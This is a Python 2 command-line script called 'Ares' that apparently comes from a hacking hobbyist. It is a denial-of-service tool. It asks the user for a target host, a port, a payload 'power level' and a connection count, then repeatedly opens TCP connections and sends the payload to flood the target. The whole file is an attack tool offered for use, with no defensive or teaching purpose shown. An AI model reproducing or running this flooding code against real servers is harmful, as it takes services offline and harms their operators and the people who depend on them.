#!/usr/bin/python
# -*- coding: utf-8 -*- 

import os
import sys
import time
import string
import socket
import threading
import subprocess
from colored import fg, bg, attr
from logos import random_logos
import power_menu
clear = lambda : os.system('tput reset')
clear()

def restart_program():
    subprocess.call(['python', 'ares.py'])

random_logos()

print ("%sAres has been awoken %s" % (fg(82), attr(0)))
target = raw_input("%sTarget: http://%s" % (fg(59), attr(0)))
print "%sAres is locked on to:%s" % (fg(82), attr(0)), target
portinfo = ["21:FTP", "22:SSH", "23:Telnet", "25:SMTP", "53:DNS", "67/68:DHCP", "69:TFTP", "80/8080:HTTP", "110:POP", "123:NTP", "137/138/139:NetBIOS","143:IMAP", "161/162:SNMP", "179:BGP", "389:LDAP", "443:HTTPS", "636:LDAPS", "989/990:FTPS"]
time.sleep(2)
clear()
while True:
    try:
        print "Type 'help' to see port menu"
        port = int(input("%sPort: %s" % (fg(59), attr(0))))
    except TypeError:
        print '\n'.join(map(str, portinfo))
    except SyntaxError:
        print "%sType a port number%s" % (fg(9), attr(0))
    except NameError:
        print "Type 'help' to see port menu"
        continue
    else:
        break

print "%sAres is locked on to port:%s" % (fg(82), attr(0)), port
time.sleep(2)
clear()
print "Type 'low' 'medium' 'high' or custum input. look at the 'MENU' file before choosing "
power_menu.data = raw_input("%sWhat power level would you like to send to the server: %s" % (fg(59), attr(0)))

power_menu.power()

print "%sInitializing data, please wait...%s" % (fg(82), attr(0))
time.sleep(3)
clear()
while True:
    try:
        connection = input("%sConnections: %s" % (fg(59), attr(0)))
    except NameError:
        print "Type how many connections you would like to make%s" % (fg(9), attr(0))
    except SyntaxError:
        print "%sType how many connections you would like to make%s" % (fg(9), attr(0))
        continue
    else:
        break
time.sleep(2)
clear()
ip = socket.gethostbyname(target)
print "%s!!!Ares has visual!!!%s" % (fg(59), attr(0))
time.sleep(3)
clear()
print "%sAttacking%s " % (fg(82), attr(0)) +target + ""
def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((target, port))
        ddos.send(power_menu.data)
        ddos.sendto(power_menu.data, (ip, port))
        ddos.send(power_menu.data)
    except socket.error:
        print("%sAres has Failed to communicate with%s" % (fg(9), attr(0))), target
    print ("%sAres is in fighting%s" % (fg(59), attr(0)))
    ddos.close()
for i in range(1, connection):
    dos()
clear()
print("%sAres has finshed attacking%s"% (fg(82), attr(0)))
if __name__ == "__main__":
    print "%sDo you wish to to awaken him again?:%s " % (fg(82), attr(0))
    answer = raw_input()
    if answer.strip() in "y Y yes YeS yEs YeS YEs yES Yes YES".split():
        restart_program()
    else:
        print "%sAries is going to rest, made by ~artofhack%s" % (fg(82), attr(0))

